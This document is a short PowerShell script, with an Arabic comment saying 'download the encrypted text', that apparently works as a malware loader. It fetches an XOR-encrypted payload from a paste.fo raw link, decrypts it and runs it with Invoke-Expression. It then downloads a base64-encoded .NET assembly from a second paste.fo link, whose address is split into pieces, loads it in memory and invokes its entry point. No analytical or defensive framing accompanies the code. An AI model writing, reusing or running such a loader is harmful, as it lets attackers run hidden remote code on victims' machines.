
$enc = [System.Text.Encoding]::UTF8

function xor {
    param($string, $method)
    $xorkey = $enc.GetBytes("secretkey")

    if ($method -eq "decrypt"){
        $string = $enc.GetString([System.Convert]::FromBase64String($string))
    }

    $byteString = $enc.GetBytes($string)
    $xordData = $(for ($i = 0; $i -lt $byteString.length; ) {
        for ($j = 0; $j -lt $xorkey.length; $j++) {
            $byteString[$i] -bxor $xorkey[$j]
            $i++
            if ($i -ge $byteString.Length) {
                $j = $xorkey.length
            }
        }
    })

    if ($method -eq "encrypt") {
        $xordData = [System.Convert]::ToBase64String($xordData)
    } else {
        $xordData = $enc.GetString($xordData)
    }
    
    return $xordData
}

$downloadLink = 'https://paste.fo/raw/7a42789a3355'

# تحميل النص المشفر
$eText = (New-Object System.Net.WebClient).DownloadString($downloadLink)

 $output = xor $eText "decrypt"
 
Invoke-Expression $output
$url = 'https://paste.fo'+'/raw/'+'86652252ed86'
$response = Invoke-WebRequest -Uri $url
$innerText = $response.ParsedHtml.body.innerText
$contentToSave =  $innerText
$data=  [System.Convert]::FromBase64String($contentToSave)
$assembly=[System.Reflection.Assembly]::Load($data)
$entryPoint = $assembly.EntryPoint
$entryPoint.Invoke($null, @())